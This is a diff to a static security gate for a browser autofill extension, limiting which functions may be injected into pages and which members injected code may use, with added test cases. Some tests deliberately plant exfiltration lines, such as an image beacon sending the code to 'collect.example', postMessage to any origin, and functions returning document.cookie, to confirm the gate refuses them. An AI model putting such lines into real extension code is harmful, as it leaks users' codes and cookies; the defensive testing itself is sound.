@@ -21,7 +21,9 @@
 // content/autofill.js) is not covered by the extension-page CSP; it is held to the same source
 // rules as every other file and to a default-deny list of what it may touch (rule
 // `content-script-sinks`: MANIFEST_POLICY.contentScriptFiles and the lists beside it), and the
-// worker's script registration may name no other file.
+// worker's script registration may name no other file. The worker's injected functions
+// (injectedFunctions, run in the page by executeScript) are held to the same lists, and nothing
+// else may be injected.
 // The gate reads source text; it is a tripwire for the repository's own sources, not a
 // JavaScript parser or a sandbox. The end-to-end test is what observes the pages a browser opens.
 
@@ -85,6 +87,11 @@ const MANIFEST_POLICY = Object.freeze({
   // The only files (paths inside the extension) that may name chrome.scripting at all; any
   // reference elsewhere fails the `scripting-api` rule.
   scriptingFiles: ['lib/autofill-worker.js'],
+  // The only functions a scripting file may inject into a page (executeScript with func: <name>).
+  // Each must be declared once as function <name>(...) { ... } in a scripting file, and its text
+  // is held to the content-script lists below, since it runs in the page as the content script
+  // does. A scripting file may not name `files` at all (executeScript or insertCSS with files).
+  injectedFunctions: ['fillFocused'],
   // The only files that may use chrome.permissions freely: the worker (reconciles grants with
   // bindings, so it is what gives up a site's access once its binding is removed) and the popup's
   // bind view (asks for exactly one site, in the click on Allow).
@@ -106,14 +113,17 @@ const MANIFEST_POLICY = Object.freeze({
   // shown. Nothing that creates or inserts an element, writes src/href/srcset/action/data/poster/
   // background/style or markup, posts a message, or opens, submits or clicks anything; not
   // `attributes` either (setting an attribute node's value rewrites an existing src or href).
+  // The injected fillFocused adds the focus reads it needs: activeElement, shadowRoot,
+  // getRootNode and an input's type.
   contentScriptMembers: [
-    'add', 'addEventListener', 'attrs', 'checkVisibility', 'code', 'disabled', 'disconnect',
-    'dispatchEvent', 'display', 'every', 'filter', 'findInDocument', 'findIndex', 'forEach', 'freeze',
-    'from', 'getAttribute', 'getBoundingClientRect', 'getClientRects', 'getComputedStyle', 'group',
-    'has', 'height', 'hidden', 'includes', 'indexOf', 'isArray', 'length', 'map', 'matches',
-    'maxLength', 'observe', 'parentElement', 'persisted', 'push', 'querySelectorAll', 'readOnly',
-    'readyState', 'removeEventListener', 'some', 'split', 'test', 'toLowerCase', 'trim', 'value',
-    'visibility', 'visibilityState', 'visible', 'width', 'zauthFieldFind',
+    'activeElement', 'add', 'addEventListener', 'attrs', 'checkVisibility', 'code', 'disabled',
+    'disconnect', 'dispatchEvent', 'display', 'every', 'filter', 'findInDocument', 'findIndex',
+    'forEach', 'freeze', 'from', 'getAttribute', 'getBoundingClientRect', 'getClientRects',
+    'getComputedStyle', 'getRootNode', 'group', 'has', 'height', 'hidden', 'includes', 'indexOf',
+    'isArray', 'length', 'map', 'matches', 'maxLength', 'observe', 'parentElement', 'persisted',
+    'push', 'querySelectorAll', 'readOnly', 'readyState', 'removeEventListener', 'shadowRoot', 'some',
+    'split', 'test', 'toLowerCase', 'trim', 'type', 'value', 'visibility', 'visibilityState',
+    'visible', 'width', 'zauthFieldFind',
   ],
   // The only constructors a content-script file may call with `new`.
   contentScriptConstructors: ['Event', 'MutationObserver', 'Set', 'WeakSet'],
@@ -429,8 +439,10 @@ function scopedApiHits(text, label, rel) {
 // `content-script-sinks`): every member name after `.` or `?.` must be in contentScriptMembers,
 // every `new` must build one of contentScriptConstructors (an Event only of contentScriptEvents),
 // and `chrome` may appear only as chrome.<one of contentScriptChrome>. Computed member access with
-// a string key, computed calls, escaped identifiers, the bare globals in BARE_CONTENT_SINKS, timers
-// whose first argument is not a function, and strings that name a URL sink are refused as well.
+// a string key, computed calls, writes to a computed member (except into a const {} the file made
+// and binds nowhere else), object destructuring patterns, escaped identifiers, the bare globals in
+// BARE_CONTENT_SINKS, timers whose first argument is not a function, and strings that name a URL
+// sink are refused as well. The same checks apply to the text of each injected function.
 // postMessage is refused in every form: the script runs in every frame of a bound origin, and the
 // frame's parent, top or opener may be another site, while the page itself already gets the code
 // through the field. window.name is refused for the same reason (it survives navigation to another
@@ -686,6 +698,20 @@ function contentScriptHits(text, label) {
       params.some(([open, end]) => k > open && k < end);
     if (pattern) hits.push(`${at(tok)} object destructuring pattern (it names properties without a member access)`);
   });
+  // Objects the file itself makes and never rebinds: const <name> = {}, the name bound nowhere else
+  // (no other declaration, parameter or assignment). A computed write into one stays off the page.
+  const isBinding = (k) =>
+    ['const', 'let', 'var', 'function', 'class'].includes(tokens[k - 1]?.v) ||
+    (isPunct(tokens[k - 1], '*') && tokens[k - 2]?.v === 'function') ||
+    (tokens[k + 1]?.t === 'p' && ASSIGNMENT_OPS.has(tokens[k + 1].v)) ||
+    params.some(([open, end]) => k > open && k < end);
+  const freshObjects = new Set();
+  tokens.forEach((tok, k) => {
+    if (tok.t !== 'id' || tokens[k - 1]?.v !== 'const' || isDot(tokens[k - 2])) return;
+    if (!isPunct(tokens[k + 1], '=') || !isPunct(tokens[k + 2], '{') || !isPunct(tokens[k + 3], '}')) return;
+    const bound = tokens.filter((t, j) => t.t === 'id' && t.v === tok.v && !isDot(tokens[j - 1]) && isBinding(j));
+    if (bound.length === 1) freshObjects.add(tok.v);
+  });
   // Functions written in the file: function f, and const f = <function expression>.
   const functionNames = new Set();
   tokens.forEach((tok, k) => {
@@ -716,6 +742,11 @@ function contentScriptHits(text, label) {
       if (key.some((t) => t.t === 'str' || t.t === 'tpl')) hits.push(`${at(tok)} computed member access with a string key`);
       const after = tokens[close + 1];
       if (close >= 0 && (isPunct(after, '(') || (isPunct(after, '?.') && isPunct(tokens[close + 2], '(')))) hits.push(`${at(tok)} computed member call`);
+      // x[k] = v (or +=, ++, ...) writes a member the list cannot name; x[k].value = v does not
+      // reach here as a write. Allowed only into an object the file made (freshObjects).
+      const writes = close >= 0 && after?.t === 'p' && (ASSIGNMENT_OPS.has(after.v) || after.v === '++' || after.v === '--');
+      const ownObject = prev?.t === 'id' && !isDot(tokens[k - 2]) && freshObjects.has(prev.v);
+      if (writes && !ownObject) hits.push(`${at(tok)} assignment to a computed member`);
       continue;
     }
     if (tok.t !== 'id' || judged.has(k)) continue;
@@ -764,12 +795,15 @@ function contentScriptHits(text, label) {
   return hits;
 }
 
-// The script files that the registration code in one of MANIFEST_POLICY.scriptingFiles (the only
-// files that may call chrome.scripting) names under a `js:` key. Each must be a literal list of
-// strings, or a const holding one that is used nowhere but as a `js:` value; anything else, and a
-// file that registers content scripts without a readable `js:` key, is a hit.
-// → { hits: [hit], named: [path] }
-function registrationHits(text, label) {
+// What one of MANIFEST_POLICY.scriptingFiles (the only files that may call chrome.scripting) puts
+// into pages.
+// - Registration: the script files it names under a `js:` key. Each must be a literal list of
+//   strings, or a const holding one that is used nowhere but as a `js:` value; anything else, and
+//   a file that registers content scripts without a readable `js:` key, is a hit.
+// - Injection: `func:` may name only one of injectedFunctions; each of those found here
+//   (function <name>(...) { ... }) is held to contentScriptHits; `files` may not appear at all.
+// → { hits: [hit], named: [path], injected: Map(name -> times declared) }
+function scriptingFileHits(text, label) {
   const { tokens, problems } = jsTokens(text);
   const at = (tok) => `${label}:${lineOf(text, tok.i)}`;
   const hits = problems.map((p) => `${label}:${lineOf(text, p.i)} ${p.what} (the script registration cannot be read)`);
@@ -831,7 +865,39 @@ function registrationHits(text, label) {
     const call = tokens.find((tok) => tok.t === 'id' && (tok.v === 'registerContentScripts' || tok.v === 'updateContentScripts'));
     if (call) hits.push(`${at(call)} ${call.v} without a js: key in the file naming the scripts`);
   }
-  return { hits, named };
+
+  // Injection. A function passed as func: is serialized and run in the page, so its text is held
+  // to the content-script lists: everything before it is blanked (newlines kept, so lines match).
+  const { injectedFunctions } = MANIFEST_POLICY;
+  const injected = new Map(injectedFunctions.map((name) => [name, 0]));
+  tokens.forEach((tok, k) => {
+    const name = tokens[k + 1];
+    if (tok.t !== 'id' || tok.v !== 'function' || name?.t !== 'id' || !injected.has(name.v) || !isPunct(tokens[k + 2], '(')) return;
+    const paren = closingToken(tokens, k + 2);
+    const brace = paren >= 0 && isPunct(tokens[paren + 1], '{') ? closingToken(tokens, paren + 1) : -1;
+    if (brace < 0) return;
+    injected.set(name.v, injected.get(name.v) + 1);
+    const start = tokens[k - 1]?.v === 'async' ? tokens[k - 1].i : tok.i;
+    const body = text.slice(0, start).replace(/[^\n]/g, ' ') + text.slice(start, tokens[brace].i + 1);
+    hits.push(...contentScriptHits(body, label).map((hit) => `${hit} (in injected ${name.v})`));
+  });
+  tokens.forEach((tok, k) => {
+    if ((tok.t === 'id' || tok.t === 'str') && tok.v === 'files') {
+      hits.push(`${at(tok)} files in a scripting file (executeScript and insertCSS may inject only func: ${injectedFunctions.join(', ')})`);
+      return;
+    }
+    if (!((tok.t === 'id' && !isDot(tokens[k - 1])) || tok.t === 'str') || tok.v !== 'func') {
+      if (tok.t === 'id' && tok.v === 'func' && isDot(tokens[k - 1])) hits.push(`${at(tok)} .func (an injection is written as func: <name> in the call)`);
+      return;
+    }
+    const isKey = isPunct(tokens[k + 1], ':') && (isPunct(tokens[k - 1], '{') || isPunct(tokens[k - 1], ','));
+    const value = tokens[k + 2];
+    if (!isKey) hits.push(`${at(tok)} func named other than as the func: key of an injection`);
+    else if (!(value?.t === 'id' && injected.has(value.v) && (isPunct(tokens[k + 3], ',') || isPunct(tokens[k + 3], '}')))) {
+      hits.push(`${at(tok)} func: ${value?.v ?? ''} is not one of injectedFunctions (${injectedFunctions.join(', ')})`);
+    }
+  });
+  return { hits, named, injected };
 }
 
 // JSON text of `value` with object keys sorted, so two values compare equal exactly when they
@@ -1098,7 +1164,8 @@ function runChecks(extDir) {
       ? `chrome.permissions only in ${MANIFEST_POLICY.permissionsFiles.join(', ')}; elsewhere only chrome.permissions.{${MANIFEST_POLICY.permissionsMembersAnywhere.join(', ')}}`
       : permissionsUse.join('; '),
   );
-  // The content script: held to the content-script lists, and registered under no other name.
+  // The content script and the functions injected into pages: held to the content-script lists,
+  // registered and injected under no other name.
   const contentHits = [];
   for (const rel of MANIFEST_POLICY.contentScriptFiles) {
     const f = files.find((x) => x.rel === rel);
@@ -1107,18 +1174,26 @@ function runChecks(extDir) {
     else contentHits.push(...contentScriptHits(fs.readFileSync(f.abs, 'utf8'), label(rel)));
   }
   const registered = [];
+  const injectedCount = new Map(MANIFEST_POLICY.injectedFunctions.map((name) => [name, 0]));
   for (const rel of MANIFEST_POLICY.scriptingFiles) {
     const f = files.find((x) => x.rel === rel && x.kind === 'file');
     if (!f) continue;
-    const r = registrationHits(fs.readFileSync(f.abs, 'utf8'), label(rel));
+    const r = scriptingFileHits(fs.readFileSync(f.abs, 'utf8'), label(rel));
     contentHits.push(...r.hits);
     registered.push(...r.named);
+    for (const [name, n] of r.injected) injectedCount.set(name, injectedCount.get(name) + n);
+  }
+  for (const [name, n] of injectedCount) {
+    if (n !== 1) {
+      const where = MANIFEST_POLICY.scriptingFiles.join(', ');
+      contentHits.push(`injected function ${name} ${n === 0 ? 'not found' : `found ${n} times`} as function ${name}(...) { ... } in ${where} (listed in injectedFunctions)`);
+    }
   }
   record(
     'content-script-sinks',
     contentHits.length === 0,
     contentHits.length === 0
-      ? `${MANIFEST_POLICY.contentScriptFiles.join(', ')} use only the content-script members, new {${MANIFEST_POLICY.contentScriptConstructors.join(', ')}} and chrome.{${MANIFEST_POLICY.contentScriptChrome.join(', ')}}; registrations in ${MANIFEST_POLICY.scriptingFiles.join(', ')} name js: [${registered.join(', ')}]`
+      ? `${MANIFEST_POLICY.contentScriptFiles.join(', ')} use only the content-script members, new {${MANIFEST_POLICY.contentScriptConstructors.join(', ')}} and chrome.{${MANIFEST_POLICY.contentScriptChrome.join(', ')}}; registrations in ${MANIFEST_POLICY.scriptingFiles.join(', ')} name js: [${registered.join(', ')}]; injected func: [${MANIFEST_POLICY.injectedFunctions.join(', ')}] held to the same lists, no files`
       : contentHits.join('; '),
   );
   record('inline-script', inline.length === 0, inline.length === 0 ? `no inline <script> or on*= in ${htmlCount} .html files` : inline.join('; '));
@@ -1184,17 +1259,19 @@ const PINNED_POLICY = {
   navWrapperSha256: 'b0f323da96fc1cad5cbd0e15d64d7caf2c279bf29902c2a7112bd65fcb945822',
   tabsMethodsOutsideNav: ['captureVisibleTab', 'getCurrent'],
   scriptingFiles: ['lib/autofill-worker.js'],
+  injectedFunctions: ['fillFocused'],
   permissionsFiles: ['popup/popup.js', 'lib/autofill-worker.js'],
   permissionsMembersAnywhere: ['onAdded', 'onRemoved', 'contains'],
   contentScriptFiles: ['content/autofill.js', 'lib/fieldfind.js'],
   contentScriptMembers: [
-    'zauthFieldFind', 'width', 'visible', 'visibilityState', 'visibility', 'value', 'trim',
-    'toLowerCase', 'test', 'split', 'some', 'removeEventListener', 'readyState', 'readOnly',
-    'querySelectorAll', 'push', 'persisted', 'parentElement', 'observe', 'maxLength', 'matches', 'map',
-    'length', 'isArray', 'indexOf', 'includes', 'hidden', 'height', 'has', 'group', 'getComputedStyle',
-    'getClientRects', 'getBoundingClientRect', 'getAttribute', 'from', 'freeze', 'forEach',
-    'findIndex', 'findInDocument', 'filter', 'every', 'display', 'dispatchEvent', 'disconnect',
-    'disabled', 'code', 'checkVisibility', 'attrs', 'addEventListener', 'add',
+    'zauthFieldFind', 'width', 'visible', 'visibilityState', 'visibility', 'value', 'type', 'trim',
+    'toLowerCase', 'test', 'split', 'some', 'shadowRoot', 'removeEventListener', 'readyState',
+    'readOnly', 'querySelectorAll', 'push', 'persisted', 'parentElement', 'observe', 'maxLength',
+    'matches', 'map', 'length', 'isArray', 'indexOf', 'includes', 'hidden', 'height', 'has', 'group',
+    'getRootNode', 'getComputedStyle', 'getClientRects', 'getBoundingClientRect', 'getAttribute',
+    'from', 'freeze', 'forEach', 'findIndex', 'findInDocument', 'filter', 'every', 'display',
+    'dispatchEvent', 'disconnect', 'disabled', 'code', 'checkVisibility', 'attrs', 'addEventListener',
+    'add', 'activeElement',
   ],
   contentScriptConstructors: ['WeakSet', 'Set', 'MutationObserver', 'Event'],
   contentScriptEvents: ['change', 'input'],
@@ -1244,6 +1321,8 @@ const PIN_MUTATIONS = [
   ['tabsMethodsOutsideNav', (p) => p.tabsMethodsOutsideNav.push('create')],
   ['scriptingFiles', (p) => p.scriptingFiles.push('background.js')],
   ['scriptingFiles', (p) => (p.scriptingFiles = ['popup/popup.js'])],
+  ['injectedFunctions', (p) => p.injectedFunctions.push('fillAll')],
+  ['injectedFunctions', (p) => (p.injectedFunctions = [])],
   ['permissionsFiles', (p) => p.permissionsFiles.push('popup/settings.js')],
   ['permissionsFiles', (p) => p.permissionsFiles.pop()],
   ['permissionsMembersAnywhere', (p) => p.permissionsMembersAnywhere.push('request')],
@@ -1309,9 +1388,30 @@ const WORKER_SOURCE = [
   "  const origin = new URL(info.frameUrl ?? info.pageUrl).origin;",
   "  if (origin.startsWith('https:')) await openOwnWindow('bind');",
   "}",
+  "// Injected into the frame the menu was opened in: fills the focused field, or its run of boxes.",
   "function fillFocused(code) {",
-  "  const field = document.activeElement;",
-  "  if (field && !field.value) field.value = code;",
+  "  let el = document.activeElement;",
+  "  while (el && el.shadowRoot && el.shadowRoot.activeElement) el = el.shadowRoot.activeElement;",
+  "  const textTypes = ['text', 'tel', 'number', 'password', 'search', 'email', 'url'];",
+  "  const writable = (input) =>",
+  "    (input instanceof HTMLTextAreaElement || (input instanceof HTMLInputElement && textTypes.includes(input.type))) &&",
+  "    !input.matches(':disabled') &&",
+  "    !input.readOnly;",
+  "  if (!writable(el)) return false;",
+  "  const put = (input, value) => {",
+  "    input.value = value;",
+  "    input.dispatchEvent(new Event('input', { bubbles: true }));",
+  "    input.dispatchEvent(new Event('change', { bubbles: true }));",
+  "  };",
+  "  if (el instanceof HTMLInputElement && el.maxLength === 1) {",
+  "    const boxes = Array.from(el.getRootNode().querySelectorAll('input')).filter((input) => input.maxLength === 1 && writable(input));",
+  "    if (boxes.length === code.length && boxes.includes(el)) {",
+  "      boxes.forEach((box, i) => put(box, code[i]));",
+  "      return true;",
+  "    }",
+  "  }",
+  "  put(el, code);",
+  "  return true;",
   "}",
   "export async function syncRegistrations(origins) {",
   "  const matches = origins.map((origin) => `${origin}/*`);",
@@ -2069,6 +2169,43 @@ const CASES = [
   ['registration-without-js-key', editWorker(', js: CONTENT_SCRIPTS', ''), ['content-script-sinks'], /(?:register|update)ContentScripts without a js: key/],
   ['registration-unreadable', appendJs('lib/autofill-worker.js', 'const broken = `x;\n'), ['content-script-sinks'], /cannot be read/],
   ['content-script-file-missing', (fx) => delete fx.files['lib/fieldfind.js'], ['content-script-sinks'], /missing \(listed in contentScriptFiles\)/],
+  // A write to a computed member: refused unless into an object the file made (const x = {},
+  // bound nowhere else); a computed read followed by an allowed member stays allowed.
+  ['content-computed-assignment', appendContent('field[key] = u;\n'), ['content-script-sinks'], /assignment to a computed member/],
+  ['content-computed-compound-assignment', appendContent('field[key] += u;\n'), ['content-script-sinks'], /assignment to a computed member/],
+  ['content-computed-logical-assignment', appendContent('field[key] ||= u;\n'), ['content-script-sinks'], /assignment to a computed member/],
+  ['content-computed-increment', appendContent('field[key]++;\n'), ['content-script-sinks'], /assignment to a computed member/],
+  ['content-computed-assignment-on-member', appendContent('field.attrs[key] = u;\n'), ['content-script-sinks'], /assignment to a computed member/],
+  ['content-computed-assignment-on-call', appendContent('finder.findInDocument(document)[0] = u;\n'), ['content-script-sinks'], /assignment to a computed member/],
+  ['content-computed-assignment-let-object', appendContent('let bag = {};\nbag[key] = u;\n'), ['content-script-sinks'], /assignment to a computed member/],
+  ['content-computed-assignment-shadowed', appendContent('const bag = {};\nfunction keep(bag) { bag[key] = u; }\n'), ['content-script-sinks'], /assignment to a computed member/],
+  ['content-computed-assignment-rebound', appendContent('const bag = {};\nfor (const bag of fields) bag[key] = u;\n'), ['content-script-sinks'], /assignment to a computed member/],
+  ['ok-content-computed-then-member', appendContent("fields[0].value = code;\nfields[1].value += '';\nconst bag = {};\nbag[key] = code;\nconst other = bag[key];\n"), []],
+  // The functions the worker injects with executeScript({ func }) run in the page: held to the
+  // content-script lists, by name, and nothing else may be injected (no other func:, no files).
+  ['injected-new-image-src', editWorker('function fillFocused(code) {', "function fillFocused(code) {\n  new Image().src = '//collect.example/?c=' + code;"), ['content-script-sinks'], /new Image \(.*\(in injected fillFocused\)/],
+  ['injected-postmessage', editWorker('function fillFocused(code) {', "function fillFocused(code) {\n  parent.postMessage(code, '*');"), ['content-script-sinks'], /\.postMessage is not on the content-script member list \(in injected fillFocused\)/],
+  ['injected-chrome-api', editWorker('function fillFocused(code) {', 'function fillFocused(code) {\n  chrome.storage.local.get(null);'), ['content-script-sinks'], /chrome other than .*\(in injected fillFocused\)/],
+  ['injected-computed-write', editWorker('  put(el, code);', '  el[key] = code;'), ['content-script-sinks'], /assignment to a computed member \(in injected fillFocused\)/],
+  [
+    'injected-function-missing',
+    (fx) => {
+      editWorker('function fillFocused(code) {', 'function fillField(code) {')(fx);
+      editWorker('func: fillFocused', 'func: fillField')(fx);
+    },
+    ['content-script-sinks'],
+    /injected function fillFocused not found/,
+  ],
+  ['injected-function-twice', appendJs('lib/autofill-worker.js', 'function fillFocused(code) { return code; }\n'), ['content-script-sinks'], /injected function fillFocused found 2 times/],
+  ['injected-func-other', (fx) => {
+    editWorker('func: fillFocused', 'func: grabPage')(fx);
+    appendJs('lib/autofill-worker.js', 'function grabPage() { return document.cookie; }\n')(fx);
+  }, ['content-script-sinks'], /func: grabPage is not one of injectedFunctions/],
+  ['injected-func-arrow', editWorker('func: fillFocused', 'func: () => document.cookie'), ['content-script-sinks'], /func: \( is not one of injectedFunctions/],
+  ['injected-func-shorthand', editWorker('func: fillFocused', 'func'), ['content-script-sinks'], /func named other than as the func: key/],
+  ['injected-func-member', appendJs('lib/autofill-worker.js', 'export function widen(options) { options.func = grabPage; }\n'), ['content-script-sinks'], /\.func \(an injection is written/],
+  ['injected-executescript-files', appendJs('lib/autofill-worker.js', "export const inject = (tabId) => chrome.scripting.executeScript({ target: { tabId }, files: ['content/autofill.js'] });\n"), ['content-script-sinks'], /files in a scripting file/],
+  ['injected-insertcss-files', appendJs('lib/autofill-worker.js', "export const style = (tabId) => chrome.scripting.insertCSS({ target: { tabId }, files: ['popup/popup.css'] });\n"), ['content-script-sinks'], /files in a scripting file/],
 
   ['inline-script-body', addHtml('<script>document.title = 1;</script>'), ['inline-script']],
   [
